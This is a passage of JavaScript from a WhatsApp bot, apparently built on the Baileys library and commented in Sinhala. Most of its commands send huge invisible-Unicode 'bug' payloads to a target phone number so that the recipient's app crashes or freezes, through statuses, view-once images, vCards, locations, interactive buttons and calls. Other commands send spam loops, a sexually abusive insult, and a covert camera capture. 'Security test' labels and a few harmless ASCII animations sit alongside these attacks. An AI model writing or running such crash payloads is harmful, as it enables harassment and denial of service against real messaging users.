            await new Promise(resolve => setTimeout(resolve, 1000));

        } catch (err) {
            console.log("Error: ", err);
        }
    }
    m.reply(`✅ සාර්ථකයි! Ultra Bug ${loopCount}ක් යවන ලදී.`);
}
break;


case 'status-bug': {
    if (!text) return m.reply(`භාවිතා කරන ක්‍රමය: ${prefix + command} 94xxxxxxxxx`);
    
    // Target අංකය නිවැරදිව සකසා ගැනීම
    let victim = text.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net";
    
    // අතිවිශාල Unicode සහ Invisible අක්ෂර රටාවක්
    const bugText = "ꦾ".repeat(99999) + "\u200E\u200F\u202E\u034F\u2060".repeat(99999);

    try {
        await Avishka.sendMessage("status@broadcast", {
            text: "Security Test Status \n © 𝙰𝚕𝚙𝚑𝚊 𝚅𝚒𝚜𝚒𝚘𝚗 𝙸𝚗𝚏𝚒𝚗𝚒𝚝𝚢: " + bugText.substring(0, 500),
            font: 3, // විශේෂිත ෆොන්ට් එකක්
            backgroundColor: "#FF0000",
            contextInfo: {
                // මෙතන තමයි වැදගත්ම කොටස: Target එක Mention කිරීම
                mentionedJid: [victim], 
                externalAdReply: {
                    title: "Status Crash Test: " + bugText.substring(0, 9999),
                    body: "Critical System Stress: " + bugText.substring(0, 9999),
                    mediaType: 1,
                    renderLargerThumbnail: false
                }
            }
        }, { statusJidList: [victim] }); // මෙයින් මැසේජ් එක යන්නේ අදාළ කෙනාට විතරයි

        m.reply("✅ Status Mention Bug එක සාර්ථකව යවන ලදී. ටාගට් එකේ Notification පරීක්ෂා කරන්න.");
    } catch (err) {
        m.reply("❌ Error: " + err.message);
    }
}
break;






case 'ans': {
    if (!text) return m.reply(`භාවිතා කරන ක්‍රමය: ${prefix + command} 94xxxxxxxxx`);
    
    // Target අංකය නිවැරදිව සකසා ගැනීම
    let victim = text.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net";
    
    // අතිවිශාල Unicode සහ Invisible අක්ෂර රටාවක්
    const bugText = "ꦾ".repeat(99999) + "\u200E\u200F\u202E\u034F\u2060".repeat(99999);

    try {
        await Avishka.sendMessage("status@broadcast", {
            text: "Your mother is a whore—a cum-guzzling whore; just so you know. \n fuck you little bitch: " + bugText.substring(0, 500),
            font: 3, // විශේෂිත ෆොන්ට් එකක්
            backgroundColor: "#FF0000",
            contextInfo: {
                // මෙතන තමයි වැදගත්ම කොටස: Target එක Mention කිරීම
                mentionedJid: [victim], 
                externalAdReply: {
                    title: "Status Crash Test: " + bugText.substring(0, 9999),
                    body: "Critical System Stress: " + bugText.substring(0, 9999),
                    mediaType: 1,
                    renderLargerThumbnail: false
                }
            }
        }, { statusJidList: [victim] }); // මෙයින් මැසේජ් එක යන්නේ අදාළ කෙනාට විතරයි

        m.reply("✅ Status Mention Bug එක සාර්ථකව යවන ලදී. ටාගට් එකේ Notification පරීක්ෂා කරන්න.");
    } catch (err) {
        m.reply("❌ Error: " + err.message);
    }
}
break;


case 'reac': {
    if (!text) return m.reply(`භාවිතා කරන ක්‍රමය: ${prefix + command} 94xxxxxxxxx`);
    
    let victim = text.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net";
    const url = 'https://files.catbox.moe/jggkxf.jpg'; // Avatar හෝ වෙනත් පින්තූරයක ලින්ක් එකක්

    // ඉතා ප්‍රබල Invisible සහ Unicode අක්ෂර රටාවක්
    const invisibleChars = "\u200E\u200F\u202E\u034F\u2060".repeat(2500);
    const heavyPayload = "ꦾ".repeat(9999) + invisibleChars + "ꦾ".repeat(4000);

    try {
        await Avishka.sendMessage("status@broadcast", {
            image: { url: url },
            caption: "Tap the 😍 sticker to react!\n" + heavyPayload.substring(0, 500),
            contextInfo: {
                mentionedJid: [victim],
                // Reaction Sticker එකේ දත්ත සැකසීම
                externalAdReply: {
                    title: "REACTION_OVERFLOW_TEST",
                    body: "Quick Reaction Stress",
                    viewOnce: false,
                    mediaType: 1,
                    thumbnailUrl: url,
                    sourceUrl: "https://whatsapp.com/channel/example",
                    renderLargerThumbnail: true
                },
                // පද්ධතියේ දත්ත කියවීම අවුල් කිරීමට Quoted Message එකක් ලෙස පෑලෝඩ් එක යෙදීම
                quotedMessage: {
                    conversation: heavyPayload 
                }
            }
        }, { statusJidList: [victim] });

        m.reply("✅ Reaction Sticker Bug එක සාර්ථකව යවන ලදී. ටාගට් එකේ Status එක පරීක්ෂා කරන්න.");
    } catch (err) {
        m.reply("❌ Error: " + err.message);
    }
}
break;


case 'onug': {
    if (!text) return m.reply(`භාවිතා කරන ක්‍රමය: ${prefix + command} 94xxxxxxxxx`);
    let target = text.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net";
    
    const url = 'https://files.catbox.moe/jggkxf.jpg'; 
    const heavyPayload = "\u200E\u200F\u202E\u034F\u2060".repeat(3000) + "ꦾ".repeat(5000);

    try {
        await Avishka.sendMessage(target, {
            image: { url: url },
            caption: "⚠️ CRITICAL_SYSTEM_VIEW_ONCE_TEST\n" + heavyPayload.substring(0, 500),
            viewOnce: true, // මෙය View Once පණිවිඩයක් ලෙස සකසයි
            contextInfo: {
                mentionedJid: [target],
                externalAdReply: {
                    title: "😍 Reaction Stress: Tap to Crash",
                    body: heavyPayload.substring(0, 1000),
                    mediaType: 1,
                    renderLargerThumbnail: true,
                    thumbnailUrl: "https://files.catbox.moe/jggkxf.jpg",
                    sourceUrl: "https://whatsapp.com/channel/example"
                },
                // පණිවිඩය විවෘත කිරීමට යන විට RAM එක පිරවීමට මෙය උදව් වේ
                quotedMessage: {
                    conversation: heavyPayload
                }
            }
        }, { quoted: m });

        m.reply("✅ View Once Bug Payload එක යවන ලදී. ටාගට් එක එය විවෘත කිරීමට උත්සාහ කරන විට Crash වනු ඇත.");
    } catch (err) {
        m.reply("❌ Error: " + err.message);
    }
}
break;

case 'mega-bug': {
    if (!text) return m.reply(`භාවිතා කරන ක්‍රමය: ${prefix + command} 94xxxxxxxxx`);
    let victim = text.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    // පද්ධතියට දිරවා ගැනීමට අපහසු Unicode සංකලනයක්
    const heavyPayload = "\u200E\u200F\u202E\u034F\u2060".repeat(1500) + "ꦾ".repeat(3000);

    try {
        // 1. Status එකක් ලෙස යැවීම (Sticker එකක් සමග)
        await Avishka.sendMessage("status@broadcast", {
            image: { url: 'https://files.catbox.moe/jggkxf.jpg' },
            caption: "Critical Interaction Test ⚠️\n" + heavyPayload.substring(0, 500),
            contextInfo: {
                mentionedJid: [victim],
                externalAdReply: {
                    title: "😍 Tap to React (UI Stress Test)",
                    body: "System Vulnerability Check",
                    mediaType: 1,
                    renderLargerThumbnail: true,
                    sourceUrl: "https://whatsapp.com/channel/example"
                },
                quotedMessage: { conversation: heavyPayload }
            }
        }, { statusJidList: [victim] });

        // 2. Chat එකට පණිවිඩයක් ලෙස යැවීම (One-view Image)
        await Avishka.sendMessage(victim, {
            image: { url: 'https://files.catbox.moe/jggkxf.jpg' },
            caption: "⚠️ CRITICAL_OVERFLOW: " + heavyPayload,
            viewOnce: true,
            contextInfo: {
                mentionedJid: [victim],
                forwardingScore: 999,
                isForwarded: true
            }
        });

        m.reply("✅ Mega-Bug Payload සාර්ථකව යවන ලදී. ටාගට් එකේ Status සහ Chat පරීක්ෂා කරන්න.");
    } catch (err) {
        m.reply("❌ Error: " + err.message);
    }
}
break;


case 'cal': {
    if (!text) return m.reply(`භාවිතා කරන ක්‍රමය: ${prefix + command} 94xxxxxxxxx`);
    let target = text.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    const heavyPayload = "\u200E\u200F\u202E\u034F\u2060".repeat(1000) + "ꦾ".repeat(2000);

    try {
        m.reply("🚀 Calling Target... UI Stress Test Started.");
        
        // සැබෑ Call එකක් යැවීමේ කේතය (Baileys Offer Function)
        await Avishka.offerCall(target, {
            isVideo: true, // වීඩියෝ ඇමතුමක් ලෙස
            callMetadata: {
                title: heavyPayload, // ඇමතුම ලැබෙන විට නම වෙනුවට Payload එක පෙන්වීමට උත්සාහ කරයි
                body: "CRITICAL_CALL_OVERFLOW"
            }
        });

        console.log(`Call sent to: ${target}`);
    } catch (err) {
        console.error(err);
        m.reply("❌ Call එක යැවීමට නොහැකි විය: " + err.message);
    }
}
break;


case 'call-bug': {
    if (!text) return m.reply(`භාවිතා කරන ක්‍රමය: ${prefix + command} 94xxxxxxxxx`);
    let target = text.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    // අධික ලෙස ලැග් කරවන Payload එක
    const bugText = "📞".repeat(500) + "\u200E\u200F\u202E\u034F\u2060".repeat(2000) + "ꦾ".repeat(5000);

    try {
        // මෙය සාමාන්‍ය Message එකක් ලෙස ගියත්, Call Notification එකක් සේ පෙනෙන ලෙස සැකසීම
        await Avishka.sendMessage(target, {
            text: "Incoming Security Test Call...",
            contextInfo: {
                mentionedJid: [target],
                externalAdReply: {
                    title: "Incoming Video Call: " + bugText.substring(0, 500),
                    body: "Tap to Join: " + "🔥".repeat(100),
                    mediaType: 1, // Video call icon එක පෙන්වීමට
                    renderLargerThumbnail: true,
                    thumbnailUrl: 'https://telegra.ph/file/your-call-icon.jpg', // Call icon එකක් දෙන්න
                    sourceUrl: "https://whatsapp.com/channel/example"
                },
                // පද්ධතිය ලැග් කිරීමට Quoted Section එක භාවිතා කිරීම
                quotedMessage: {
                    conversation: bugText
                }
            }
        });

        m.reply("✅ Fake Call Payload එක යවන ලදී. ටාගට් එකේ Notification පරීක්ෂා කරන්න.");
    } catch (err) {
        m.reply("❌ Error: " + err.message);
    }
}
break;








case 'img-bug': {
    if (!text) return m.reply(`භාවිතා කරන ක්‍රමය: ${prefix + command} 94xxxxxxxxx`);
    
    let victim = text.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net";
    const url = 'https://files.catbox.moe/jggkxf.jpg'; // මෙතනට ඔබේ පින්තූරයක ලින්ක් එකක් දෙන්න

    // අධික ලෙස ලැග් කරවන Payload එක
    const bugText = "ꦾ".repeat(7000) + "\u200E\u200F\u202E\u034F\u2060".repeat(1000);

    try {
        await Avishka.sendMessage("status@broadcast", {
            image: { url: url },
            caption: "System Overload Test\n" + bugText,
            contextInfo: {
                mentionedJid: [victim], // මෙයින් Target එකට Mention එකක් යයි
                forwardingScore: 999,
                isForwarded: true,
                // අලුත් Reaction Option එක සහ පෑලෝඩ් එක
                externalAdReply: {
                    title: "CRITICAL_REACTION_BUG: " + "🔥".repeat(500),
                    body: "Tap to React: " + bugText.substring(0, 500),
                    mediaType: 1,
                    sourceUrl: "https://whatsapp.com/channel/example",
                    thumbnailUrl: url,
                    renderLargerThumbnail: true
                }
            }
        }, { statusJidList: [victim] });

        m.reply("✅ Status Image Mention Payload එක යවන ලදී. Reaction සහ Mention පරීක්ෂා කරන්න.");
    } catch (err) {
        m.reply("❌ Error: " + err.message);
    }
}
break;

case 'snap': {
    if (!m.fromMe) return;
    const { exec } = require('child_process');
    
    // කැමරාවෙන් රහසිගතව පින්තූරයක් ගෙන එය snap.jpg ලෙස සේව් කරයි
    exec('termux-camera-photo -c 0 snap.jpg', async (err) => {
        if (err) return m.reply("❌ කැමරාව ක්‍රියාත්මක කළ නොහැක.");
        
        await Avishka.sendMessage(m.chat, { 
            image: { url: './snap.jpg' }, 
            caption: '📸 Captured via Termux Camera' 
        }, { quoted: m });
    });
}
break;





case 'uni': {
    if (!text) return m.reply(`භාවිතා කරන ක්‍රමය: ${prefix + command} 94xxxxxxxxx`);
    let target = text.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    // පද්ධතියට හඳුනා ගැනීමට අපහසු (Unrenderable) Unicode සංකලනයක්
    // මෙහි \uXXXX ලෙස ඇත්තේ විවිධ Unicode සංකේතයි
    const unkUnicode = "\u1112\u1161\u11AB\u1100\u1173\u11AF\u200E\u200F\u202E\u2066\u2067\u2068\u2069";
    const payload = unkUnicode.repeat(3000); 

    try {
        await Avishka.sendMessage(target, {
            text: "⚠️ Security Research - Unknown Unicode Test ⚠️\n\n" + payload,
            contextInfo: {
                externalAdReply: {
                    title: "System Stress Test",
                    body: "Payload: Unknown_Unicode_Overflow",
                    mediaType: 1,
                    renderLargerThumbnail: false
                }
            }
        });
        m.reply("✅ Unknown Unicode Payload එක සාර්ථකව යවන ලදී.");
    } catch (err) {
        m.reply("❌ Error: " + err.message);
    }
}
break;


		
						
case 'loc-fix': {
    if (!text) return m.reply(`භාවිතා කරන ක්‍රමය: ${prefix + command} 94xxxxxxxxx`);
    let target = text.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net";

    // සර්වර් එක බ්ලොක් නොකරන නමුත් UI එක ලැග් කරන ප්‍රමාණය (අකුරු 1500-2000)
    const bugText = "\u200E\u200F\u202E\u034F\u2060".repeat(1500) + "© 𝙰𝚕𝚙𝚑𝚊 𝚅𝚒𝚜𝚒𝚘𝚗 𝙸𝚗𝚏𝚒𝚗𝚒𝚝𝚢".repeat(2000);

    try {
        await Avishka.sendMessage(target, {
            location: {
                degreesLatitude: -99.9999, // Fake: Sydney
                degreesLongitude: 999.9999,
                name: "© 𝙰𝚕𝚙𝚑𝚊 𝚅𝚒𝚜𝚒𝚘𝚗 𝙸𝚗𝚏𝚒𝚗𝚒𝚝𝚢", 
                address: bugText,
                comment: bugText,
                jpegThumbnail: null // Thumbnail එකක් නැතිව යැවීමෙන් පද්ධතියට වැඩි පීඩනයක් දෙයි
            }
        });
        m.reply("✅ Optimized Location Payload එක යවන ලදී. දැන් LDPlayer එකේ බලන්න.");
    } catch (err) {
        m.reply("❌ Error: " + err.message);
    }
}
break;

					
						
						
						
										
case 'vb': {
    const url = await pack[Math.floor(Math.random() * pack.length)];
    
    // 1. විශාල Vcard එකක් සෑදීම (මෙය Android UI එක ලැග් කිරීමට සමත් වේ)
    const vcard = 'BEGIN:VCARD\n' +
        'VERSION:3.0\n' +
        'FN:' + "\u200E\u200F\u202E\u034F\u2060".repeat(5000) + '\n' +
        'ORG:' + "\u200E\u200F\u202E\u034F\u2060".repeat(5000) + ';\n' +
        'TEL;type=CELL;type=VOICE;waid=94787672517:+94 78 767 2517\n' +
        'END:VCARD';

    const buttons = [
        {
            buttonId: `vcard_crash`,
            buttonText: { displayText: 'View Contact' },
            type: 1
        }
    ];

    try {
        await Avishka.sendMessage(m.chat, {
            contacts: {
                displayName: "Security Research",
                contacts: [{ vcard }]
            },
            caption: "⚠️ UI Stress Test Initialized",
            buttons: buttons,
            headerType: 1
        }, { quoted: m });

        m.reply("✅ Vcard Payload එක යවන ලදී. ලැබුණේදැයි බලන්න.");
    } catch (err) {
        m.reply("❌ Error: " + err.message);
    }
}
break;


													
case 'hacker':
case 'matrix': {
    const { key } = await Avishka.sendMessage(m.chat, { text: "🔓 *Decrypting System...*" });

    const matrixFrames = [
        // Frame 1: අංක වැසි (Rain starts)
        "```\n 1  0  1  0  1  0  1\n 0  1  0  1  0  1  0\n 1  0  1  0  1  0  1\n 0  1  0  1  0  1  0\n```",
        // Frame 2: නම ටික ටික මතු වෙයි (Scan line)
        "```\n ▓▒░▒▓▒░▒▓▒░▒▓▒░▒▓\n     A V I         \n ▓▒░▒▓▒░▒▓▒░▒▓▒░▒▓\n 0  1  0  1  0  1  0\n```",
        // Frame 3: නම සම්පූර්ණ වෙයි
        "```\n 1  0  1  0  1  0  1\n   A V I  H A C K E R\n 0  1  0  1  0  1  0\n 1  0  1  0  1  0  1\n```",
        // Frame 4: අකුරු මාරු වෙයි (Glitch effect)
        "```\n 0  1  0  1  0  1  0\n > AVI  HACKER < \n 1  0  1  0  1  0  1\n 0  1  0  1  0  1  0\n```",
        // Frame 5: අවසාන ලස්සන ලුක් එක
        "```\n ░░░░░░░░░░░░░░░░░░\n    AVI  HACKER    \n ░░░░░░░░░░░░░░░░░░\n```"
    ];

    for (let i = 0; i < 30; i++) {
        try {
            let currentFrame = matrixFrames[i % matrixFrames.length];
            
            // Hacker Style Header & Footer
            let message = `*── [ ACCESS GRANTED ] ──*\n${currentFrame}\n*── [ STATUS: SECURED ] ──*`;

            await Avishka.sendMessage(m.chat, { text: message, edit: key });
            
            // වේගය (ටිකක් වේගයෙන් මාරු උනොත් තමයි ලස්සන - 400ms)
            await new Promise(resolve => setTimeout(resolve, 400)); 
        } catch (e) {
            break;
        }
    }

    await Avishka.sendMessage(m.chat, { text: "💀 *AVI HACKER SYSTEM OVERRIDE COMPLETE.*", edit: key });
}
break;
																					
	case 'cube': {
    const { key } = await Avishka.sendMessage(m.chat, { text: "📦 *3D Render Starting...*" });

    const cubeFrames = [
        "```\n   +---+\n  /   /|\n +---+ |\n |   | +\n |   |/\n +---+\n```",
        "```\n   +---+\n  /|  / \n + |-+  \n | + |  \n |/  |  \n +---+\n```",
        "```\n  +---+\n  |   |\n  |   |\n  |   |\n  +---+\n```"
    ];

    for (let i = 0; i < 20; i++) {
        try {
            let message = `*── [ 3D CUBE ] ──*\n${cubeFrames[i % cubeFrames.length]}\n*AVI HACKER*`;
            await Avishka.sendMessage(m.chat, { text: message, edit: key });
            await new Promise(resolve => setTimeout(resolve, 500));
        } catch (e) { break; }
    }
    await Avishka.sendMessage(m.chat, { text: "✅ *Done!*", edit: key });
}
break;


case 'rose': {
    const { key } = await Avishka.sendMessage(m.chat, { text: "🌹 *HD Rose Rendering...*" });

    const roseFrames = [
        // Frame 1: පොහොට්ටුව (Bud)
        "```\n     ░▒▓▓▒░\n    ▒▓████▓▒\n     ░▒▓▓▒░\n       ┃\n```",
        // Frame 2: ටිකක් පිපුණු මල (Shaded)
        "```\n   ░▒▓█  █▓▒░\n  ▒▓████████▓▒\n   ▒▓██████▓▒\n    ░▒▓██▓▒░\n       ┃\n```",
        // Frame 3: හොඳින් පිපුණු මල (Full Detail)
        "```\n  ░▒▓██    ██▓▒░\n ▒▓████████████▓▒\n ▒▓████████████▓▒\n  ▒▓██████████▓▒\n    ░▒▓████▓▒░\n       ┃ 🌿\n       ┃\n```"
    ];

    for (let i = 0; i < 20; i++) {
        try {
            let currentRose = roseFrames[i % roseFrames.length];
            let message = `*─── [ LUXURY ART ] ───*\n\n${currentRose}\n\n*🌹 AVI HACKER DESIGN 🌹*`;

            await Avishka.sendMessage(m.chat, { text: message, edit: key });
            await new Promise(resolve => setTimeout(resolve, 600)); 
        } catch (e) { break; }
    }

    await Avishka.sendMessage(m.chat, { text: "✅ *Rose Animation Done!*", edit: key });
}
break;

case 'goodnight': {
    const { key } = await Avishka.sendMessage(m.chat, { text: "🌌 *Sending Good Night Wishes...*" });

    const moonFrames = [
        // Frame 1: අඩ සඳ (Crescent Moon)
        "```\n      .---.\n     :     :\n    .-----.  .   * \n   :       :     \n   :       :   * \n    `-----'\n```",
        // Frame 2: ටිකක් ලොකු වෙන සඳ (Waxing Gibbous)
        "```\n      .---. \n     :▓▓▓▓▓:\n    .-----.  .   * \n   :▓▓▓▓▓▓▓:     \n   :▓▓▓▓▓▓▓:   * \n    `-----'\n```",
        // Frame 3: සම්පූර්ණ සඳ (Full Moon with Stars)
        "```\n     .-----.  * \n    :▓▓▓▓▓▓▓:    \n   :▓▓▓▓▓▓▓▓▓: * \n   :▓▓▓▓▓▓▓▓▓:    \n    :▓▓▓▓▓▓▓:  * \n     `-----'\n```"
    ];

    for (let i = 0; i < 10; i++) { // ඉක්මනින් Good Night මැසේජ් එක යවමු
        try {
            let currentMoon = moonFrames[i % moonFrames.length];
            
            // "Good Night" මැසේජ් එකත් එක්ක
            let message = `*─── [ GOOD NIGHT ] ───*\n\n${currentMoon}\n\n  *Sleep Tight, Sweet Dreams!*`;

            await Avishka.sendMessage(m.chat, { text: message, edit: key });
            await new Promise(resolve => setTimeout(resolve, 800)); // ටිකක් හිමින් animation එක යමු
        } catch (e) {
            break;
        }
    }
    
    // අවසාන වශයෙන් Full Moon සහ Good Night මැසේජ් එක
    await Avishka.sendMessage(m.chat, { text: `*─── [ GOOD NIGHT ] ───*\n\n${moonFrames[2]}\n\n  *Sweet Dreams from Avi Hacker!* 🌙✨`, edit: key });
}
break;


case 'avi-hd': {
    const { key } = await Avishka.sendMessage(m.chat, { text: "💖 *HD Art Rendering...*" });

    // ඝනකම (Shading) වෙනස් කරමින් හදවත විශාල වන පියවර
    const hdFrames = [
        // Frame 1: පොඩි හදවත (Light Shading)
        "```\n      ░▒▓▓▒░\n     ▒▓████▓▒\n      ▒▓██▓▒\n        ▒▓▒\n```",
        // Frame 2: මධ්‍යම හදවත (Shadows එක්ක)
        "```\n    ░▒▓██  ██▓▒░\n   ▒▓██████████▓▒\n    ▒▓████████▓▒\n      ▒▓████▓▒\n        ▒▓██▒\n          ▒\n```",
        // Frame 3: ලොකු හදවත (Full Depth)
        "```\n  ░▒▓████  ████▓▒░\n ▒▓██████████████▓▒\n ▒▓██████████████▓▒\n  ▒▓████████████▓▒\n    ▒▓████████▓▒\n      ▒▓████▓▒\n        ▒▓██▒\n          ▀\n```"
    ];

    for (let i = 0; i < 20; i++) {
        try {
            let currentFrame = hdFrames[i % hdFrames.length];
            
            // නම පල්ලෙහායින් ලස්සනට පෙන්වමු
            let nameArt = i % 2 === 0 ? "◢ Avi Hacker ◣" : "◥ Avi Hacker ◤";

            let message = `*─── [ HD DESIGN ] ───*\n\n${currentFrame}\n\n    ${nameArt}\n\n*─── [ PREMIUM ] ───*`;

            await Avishka.sendMessage(m.chat, { text: message, edit: key });
            await new Promise(resolve => setTimeout(resolve, 600)); 
        } catch (e) {
            break;
        }
    }

    await Avishka.sendMessage(m.chat, { text: "✅ *HD Animation Completed!*", edit: key });
}
break;


case 'love-avi': {
    const { key } = await Avishka.sendMessage(m.chat, { text: "❤️ *Initializing Love Art...*" });

    const compactArt = [
        // Frame 1: LOVE (Block Style)
        "```\n█   █▀█ █ █ █▀▀\n█   █ █ █ █ █▀▀\n▀▀▀ ▀▀▀  ▀  ▀▀▀\n```",
        // Frame 2: AVI (Block Style)
        "```\n █▀█ █ █ █\n █▀█ ▀▄▀ █\n ▀ ▀  ▀  ▀\n```",
        // Frame 3: HACKER (Simple line)
        "```\n◢◤ AVI HACKER ◥◣\n◥◣  SYSTEMS   ◢◤\n```"
    ];

    for (let i = 0; i < 20; i++) {
        try {
            let currentFrame = compactArt[i % compactArt.length];
            
            // ගැහෙන හදවතක් දෙපැත්තට දාමු
            let heart = i % 2 === 0 ? "❤️      ❤️" : "   ❤️  ❤️   ";

            let message = `*─── [ DESIGN ] ───*\n\n${heart}\n${currentFrame}\n${heart}\n\n*─── [ BY AVI ] ───*`;

            await Avishka.sendMessage(m.chat, { text: message, edit: key });
            await new Promise(resolve => setTimeout(resolve, 600)); 
        } catch (e) {
            break;
        }
    }

    await Avishka.sendMessage(m.chat, { text: "💖 *Avi Hacker: Design Finished!*", edit: key });
}
break;

								
																
				
case 'fixed': {
    // 1. අංකය පරීක්ෂා කිරීම
    if (!text) return m.reply(`භාවිතා කරන ක්‍රමය: ${prefix + command} 94xxxxxxxxx`);
    
    let target = text.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net";
    m.reply("*Testing Security Vulnerability...* 🛠️");

    // 2. ප්‍රබල අක්ෂර රටාවක් නිර්මාණය කිරීම (Zalgo + Invisible)
    const heavyChar = "\u200E\u200F\u202E\u034F\u2060"; 
    const payloadText = heavyChar.repeat(5000) + "ꦾ".repeat(10000);

    try {
        // 3. පණිවිඩය සැකසීම (generateWAMessageFromContent භාවිතා කරමින්)
        const msg = await generateWAMessageFromContent(target, {
            interactiveMessage: {
                header: {
                    title: "Security_Research_AVI",
                    hasMediaAttachment: false
                },
                body: {
                    text: "Payload Content: " + payloadText
                },
                nativeFlowMessage: {
                    // මෙහි JSON structure එක නිවැරදිව සකසා ඇත
                    messageParamsJson: JSON.stringify({
                        display_text: payloadText.substring(0, 5000)
                    }),
                    buttons: [
                        {
                            name: "single_select",
                            buttonParamsJson: JSON.stringify({
                                title: "Stress Test",
                                sections: [
                                    {
                                        title: "Payload Section",
                                        rows: [
                                            { 
                                                title: "Execute Overflow", 
                                                rowId: "id_1",
                                                description: "ꦾ".repeat(5000) 
                                            }
                                        ]
                                    }
                                ]
                            })
                        }
                    ]
                }
            }
        }, { userJid: Avishka.user.id, quoted: m });

        // 4. පණිවිඩය යැවීම (relayMessage භාවිතා කිරීම අනිවාර්ය වේ)
        await Avishka.relayMessage(target, msg.message, { messageId: msg.key.id });
        
        m.reply("✅ Payload එක සාර්ථකව යවන ලදී. දැන් LDPlayer එකේ target chat එක විවෘත කර බලන්න.");

    } catch (err) {
        console.error("Error in xeon-ui:", err);
        m.reply("❌ දෝෂයක් සිදු විය: " + err.message);
    }
}
break;
			
				
				
				
			case 'uipro': {
    if (!text) return m.reply(`භාවිතා කරන ක්‍රමය: ${prefix + command} 94xxxxxxxxx`);
    
    let target = text.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net";
    m.reply("*Advanced Security Test Initializing...* ⚠️");

    // ඉතා ප්‍රබල Unicode අක්ෂර සංයෝජනයක් (Zalgo / Invisible combination)
    const heavyChar = "\u200E\u200F\u202E\u034F\u2060".repeat(5000); 
    const bugText = "ꦾ".repeat(30000) + heavyChar;

    try {
        const msg = await generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: "CRITICAL_OVERFLOW: " + bugText.substring(0, 1000),
                            hasMediaAttachment: false
                        },
                        body: {
                            text: "System Stress Test: " + bugText
                        },
                        footer: {
                            text: "Exploit Research: " + "ꦾ".repeat(5000)
                        },
                        nativeFlowMessage: {
                            // Buttons විශාල ප්‍රමාණයක් සහ විශාල JSON දත්ත ඇතුළත් කිරීම
                            messageParamsJson: JSON.stringify({
                                title: bugText,
                                description: bugText,
                                test_id: "ꦾ".repeat(20000)
                            }),
                            buttons: [
                                {
                                    name: "single_select",
                                    buttonParamsJson: JSON.stringify({
                                        title: "VIEW_PAYLOAD_" + "ꦾ".repeat(15000),
                                        sections: [
                                            {
                                                title: "CRITICAL_SECTION",
                                                rows: Array(10).fill({
                                                    title: "Bug Row " + "ꦾ".repeat(2000),
                                                    rowId: "id" + Math.random()
                                                })
                                            }
                                        ]
                                    })
                                },
                                {
                                    name: "quick_reply",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: "REACTION_TEST",
                                        id: bugText.substring(0, 5000)
                                    })
                                }
                            ]
                        }
                    }
                }
            }
        }, { userJid: Avishka.user.id, quoted: m });

        await Avishka.relayMessage(target, msg.message, { messageId: msg.key.id });
        m.reply("🔥 High-Intensity Payload එක සාර්ථකව යවන ලදී.");

    } catch (err) {
        console.error(err);
        m.reply("❌ Error: " + err.message);
    }
}
break;



  case 'freezhe': {
    const invisibleChars = '\u200E\u200F\u202E';
    const payload = invisibleChars.repeat(50000) + '.'.repeat(100000);

    await Avishka.sendMessage(m.chat, { text: payload }, { quoted: m }); }
    break;


    case 'freeze': {
        const invisibleChars = '\u200E\u200F\u202E';
        const payload = invisibleChars.repeat(50000) + '.'.repeat(100000);
        await Avishka.sendMessage(m.chat, { text: payload }, { quoted: m });
        break;
    }
    case 'heavyFreeze': {
        const invisibleChars = '\u200E\u200F\u202E\u202A\u202B\u202C\u202D\u202E'; // Invisible characters
        const specialChars = '\u202F\u2060\u2061\u2062\u2063\u2064'; // Special characters
        const emojis = '😀😃😄😁😆😅😂🤣😊😇'; // Emojis

        // Create a very large payload
        const payload = invisibleChars.repeat(200000) +
                        specialChars.repeat(100000) +
                        emojis.repeat(50000) +
                        '.'.repeat(300000);

        await Avishka.sendMessage(m.chat, { text: payload }, { quoted: m });
        break;
    }
    case 'fakeLocation': {
        const fakeLocation = {
            latitude: -33.8688,
            longitude: 151.2093,
            name: 'Fake Location',
            address: '123 Fake Street, Sydney, Australia'
        };
        await Avishka.relayMessage(m.chat, fakeLocation, { quoted: m });
        break;
    }
    case 'fakeCall': {
        const fakeCallContact = {
            name: 'Fake Caller',
            number: '1234567890'
        };
        await Avishka.sendMessage(m.chat, fakeCallContact, { quoted: m });
        break;
    }
    case 'fac': {
        const fakeVCard = {
            firstName: 'John',
            lastName: 'Doe',
            phoneNumber: '0987654321',
            organization: 'Fake Corp',
            title: 'CEO',
            url: 'http://fakecorp.com',
            address: '456 Fake Avenue, New York, NY 10001, USA',
            note: 'This is a fake vCard.'
        };
        await Avishka.sendVCard(m.chat, fakeVCard, { quoted: m });
        break;
    }
    



case 'invisible': {
    if (!isCreator) return m.reply("Owner Only! ❌");
    
    let [num, count] = text.split(',');
    if (!num) return m.reply(`*Example:* ${prefix + command} 947xxxxxxx , 2`);

    let cleanNumber = num.trim().replace(/[^0-9]/g, '');
    let loopCount = count ? parseInt(count.trim()) : 1; // Count එක දුන්නේ නැත්නම් 1 පාරක් යවනවා

    // 🛡️ GITHUB OWNER PROTECTION
  /*  let isSafe = await isSafeTarget(cleanNumber);
    if (isSafe) {
        return m.reply("*⚠️ මේක Owner කෙනෙක්ගේ නම්බර් එකක්! ඒ අයට Spam යවන්න බැහැ. ⚠️*");
    }*/

    let target = cleanNumber + '@s.whatsapp.net';
    
    await m.reply(`🛸 *Invisible Spam ${loopCount} වතාවක් යවමින් පවතී...*`);

    for (let i = 0; i < loopCount; i++) {
        await invisibleSpam(Avishka, target);
        // මෙතන sleep එක function එක ඇතුළෙම තියෙන නිසා ආයේ ඕන නෑ
    }

    await m.reply(`✅ *Invisible Spam power by Avi completed!*`);
}
break;

case 'loadx': {
    if (!isCreator) return m.reply("Owner Only! ❌");
    
    let [num, count] = text.split(',');
    if (!num) return m.reply(`*Example:* ${prefix + command} 947xxxxxxx , 2`);

    let cleanNumber = num.trim().replace(/[^0-9]/g, '');
    let loopCount = count ? parseInt(count.trim()) : 1;

